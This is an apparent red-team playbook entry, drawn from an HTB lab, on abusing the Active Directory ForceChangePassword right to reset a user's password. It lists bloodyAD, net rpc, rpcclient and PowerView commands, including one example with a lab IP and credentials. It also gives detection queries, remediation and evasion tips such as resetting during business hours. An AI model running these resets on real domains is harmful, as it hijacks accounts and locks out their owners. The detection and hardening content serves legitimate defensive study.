name: ForceChangePassword (Reset a User's Password)
description: With the User-Force-Change-Password extended right (or GenericAll) over a user, reset that user's password WITHOUT knowing the current one. LOUD and disruptive - it locks the real owner out and is easy to spot - so prefer Shadow Credentials when the target's msDS-KeyCredentialLink is writable.
source: HTB Fluffy engagement; BloodHound ACL abuse
notes:
=== THE EDGE ===
BloodHound ForceChangePassword (or GenericAll) from a principal you control to a user
means you can overwrite that user's password without the old one.

=== LOUD - USE WITH CARE ===
  - The real owner can no longer log in with their old password -> help-desk ticket, alert.
  - On engagements, prefer Shadow Credentials (no reset) if msDS-KeyCredentialLink is writable.
  - If you must reset, note the change and (ideally) restore, though the original hash is unknown.

=== TOOLING OPTIONS ===
  bloodyAD:  set password <target_account> '<new_password>'
  net rpc:    net rpc password <target_account> '<new_password>' -U '<domain>/<user>%<password>' -S <dc_ip>
  rpcclient:  rpcclient -U '<domain>/<user>%<password>' <dc_ip> -c 'setuserinfo2 <target_account> 23 <new_password>'
  PowerView:  Set-DomainUserPassword -Identity <target_account> -AccountPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force)

=== AFTER RESET ===
Authenticate as the target and continue the chain (its group memberships, ACLs, etc.).

examples.label: bloodyAD - reset a user's password
examples.command: bloodyAD --host 10.129.65.243 -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' set password p.agila 'NewP@ss123!'

recommended.note: Stealthier alternative when msDS-KeyCredentialLink is writable (no reset).
GenericAll often grants both this and group-add abuse.

defense.why_it_works: The attacker holds the User-Force-Change-Password extended right (or GenericAll) over the target, so the DC lets them set a new password without supplying the current one.
defense.prerequisites: ForceChangePassword or GenericAll over the target user object.
defense.impact: Full takeover of the target account (attacker sets a known password); disruptive because the original owner is locked out.
defense.detection: [MITRE T1098] Event 4724 (an attempt was made to reset an account's password) where the actor is not the account owner or a help-desk admin; Event 4723 (password change) patterns; Event 5136 on the target; a burst of resets by one principal.
defense.artifacts: 4724 password-reset events; the target user unable to log in with their old password; 5136 modifications.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=4724
| where SubjectUserName!=TargetUserName
| table _time, SubjectUserName, TargetUserName
| sort - _time

index=wineventlog sourcetype="WinEventLog:Security" EventCode=4724
| stats dc(TargetUserName) as targets by SubjectUserName
| where targets>3
defense.sentinel_kql:
SecurityEvent
| where EventID == 4724
| where SubjectUserName != TargetUserName
| summarize targets=make_set(TargetUserName), count() by SubjectUserName, bin(TimeGenerated, 1h)
| sort by count_ desc
defense.prevention: Minimize who holds ForceChangePassword/GenericAll over users (remove from service and low-priv accounts); alert on 4724 where actor != owner and actor is not an approved help-desk role; use Protected Users for sensitive accounts; enforce change control on password resets.
defense.evasion: Reset during business hours to blend with legitimate help-desk activity; target one account rather than many to avoid burst detection.
defense.misconfiguration: Non-administrative principals hold the User-Force-Change-Password extended right or GenericAll over user objects, typically from over-broad delegation.
defense.secure_config:
# Remove the ACE granting the reset right (example with dsacls):
dsacls "CN=<target_account>,OU=Users,DC=<domain>" /R "<domain>\<over_privileged_principal>"
# Alert on Event 4724 where SubjectUserName != TargetUserName and the actor is not an approved role.

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review Windows Security Event Log for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

interview.q: When would you choose Shadow Credentials over ForceChangePassword, given both are available?
interview.a: Shadow Credentials when the target's msDS-KeyCredentialLink is writable: it does not reset the password, so it does not lock out the owner or trigger help-desk alerts, and it is reversible. ForceChangePassword is louder and disruptive, so reserve it for when key-credential write is not available.

interview.q: What single event best flags a malicious forced reset, and what makes it suspicious?
interview.a: Event 4724 (attempt to reset an account's password) where the actor is not the account owner or an approved help-desk admin - especially one principal resetting several accounts, or resetting a privileged account, outside normal support workflows.

explain:
Resets a target user's password without knowing the current one, using the User-Force-Change-Password right (or GenericAll):
  --host <dc_ip>            the Domain Controller
  -d <domain>              the domain
  -u <user> -p <password>  authenticate as the account that holds the right
  set password <target_account> '<new_password>'   force the new password on the victim
You now own <target_account> - but this locks the real owner out and is loud, so prefer Shadow Credentials when you have write access.
